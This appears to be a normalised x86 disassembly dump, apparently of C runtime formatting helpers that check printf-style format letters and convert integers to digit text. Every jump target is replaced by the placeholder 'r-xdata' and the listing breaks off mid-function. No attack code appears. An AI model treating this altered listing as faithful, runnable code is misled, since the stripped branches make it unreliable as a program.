mov ecx [ ebp + 0x8 ]
mov [ ecx ] dx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov cx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427a39
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41b39d
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
cmp al 0x63
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp al 0x43
je r-xdata
xor eax eax
pop ebp
retn
sub_41b3b6
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
cmp al 0x63
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp al 0x43
je r-xdata
xor eax eax
pop ebp
retn
sub_41b3cf
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x63
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x43
je r-xdata
xor eax eax
pop ebp
retn
sub_41b3eb
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x63
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x43
je r-xdata
xor eax eax
pop ebp
retn
sub_41b407
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
cmp al 0x64
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp al 0x69
je r-xdata
cmp al 0x6f
je r-xdata
cmp al 0x75
je r-xdata
cmp al 0x78
je r-xdata
cmp al 0x58
je r-xdata
cmp al 0x2a
je r-xdata
xor eax eax
pop ebp
retn
sub_41b434
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
cmp al 0x64
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp al 0x69
je r-xdata
cmp al 0x6f
je r-xdata
cmp al 0x75
je r-xdata
cmp al 0x78
je r-xdata
cmp al 0x58
je r-xdata
cmp al 0x2a
je r-xdata
xor eax eax
pop ebp
retn
sub_41b461
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
cmp ax 0x64
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp ax 0x69
je r-xdata
cmp ax 0x6f
je r-xdata
cmp ax 0x75
je r-xdata
cmp ax 0x78
je r-xdata
cmp ax 0x58
je r-xdata
cmp ax 0x2a
je r-xdata
xor eax eax
pop ebp
retn
sub_41b49d
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
cmp ax 0x64
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp ax 0x69
je r-xdata
cmp ax 0x6f
je r-xdata
cmp ax 0x75
je r-xdata
cmp ax 0x78
je r-xdata
cmp ax 0x58
je r-xdata
cmp ax 0x2a
je r-xdata
xor eax eax
pop ebp
retn
sub_41b51b
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
cmp al 0x73
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp al 0x53
je r-xdata
xor eax eax
pop ebp
retn
sub_41b534
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
cmp al 0x73
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp al 0x53
je r-xdata
xor eax eax
pop ebp
retn
sub_41b54d
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x73
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x53
je r-xdata
xor eax eax
pop ebp
retn
sub_41b569
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x73
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x53
je r-xdata
xor eax eax
pop ebp
retn
sub_41b585
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
dec eax
sub eax 0x1
je r-xdata
xor al al
pop ebp
retn
sub eax 0x1
je r-xdata
mov al 0x1
pop ebp
retn
sub eax 0x9
je r-xdata
cmp [ ebp + 0x14 ] 0xd
je r-xdata
mov al [ ebp + 0x10 ]
cmp al 0x63
je r-xdata
mov cl 0x1
cmp al 0x73
je r-xdata
xor cl cl
jmp r-xdata
xor eax eax
test cl cl
sete al
pop ebp
retn
sub_41b5c5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
dec eax
sub eax 0x1
je r-xdata
xor al al
pop ebp
retn
sub eax 0x1
je r-xdata
mov al 0x1
pop ebp
retn
sub eax 0x9
je r-xdata
cmp [ ebp + 0x14 ] 0xd
je r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
and eax 0x4
mov dl 0x1
or eax ecx
jne r-xdata
cmp [ ebp + 0x10 ] 0x63
je r-xdata
mov dl cl
mov cl 0x1
cmp [ ebp + 0x10 ] 0x73
jne r-xdata
xor eax eax
cmp dl cl
sete al
pop ebp
retn
sub_41b6e0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
movsx eax [ eax ]
push eax
call sub_435830
pop ecx
pop ecx
pop ebp
retn
sub_41b6fa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
push eax
call sub_435654
pop ecx
pop ecx
pop ebp
retn
sub_41b8d5
mov edi edi
push esi
mov esi ecx
push edi
mov edi [ esi + 0x404 ]
call sub_419019
test edi edi
jne r-xdata
add eax edi
add eax esi
jmp r-xdata
pop edi
pop esi
retn
sub_41b8f3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_433e4c
add esp 0xc
pop ebp
retn
sub_41b911
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_433f54
add esp 0xc
pop ebp
retn
sub_41b92f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_433e4c
add esp 0xc
pop ebp
retn
sub_41b94d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_433f54
add esp 0xc
pop ebp
retn
sub_41b96b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41b9e0
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41ba55
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41baca
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bb3f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bbb4
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bc29
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bc9e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bd13
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bd88
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bdfd
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41be72
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bee7
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_448b80
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bf6f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_448b80
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bff7
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_448b80
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c07f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_448b80
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c107
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_448b80
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c18f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_448b80
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c217
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_448b80
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c29f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_448b80
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c327
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_448b80
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c3af
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_448b80
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
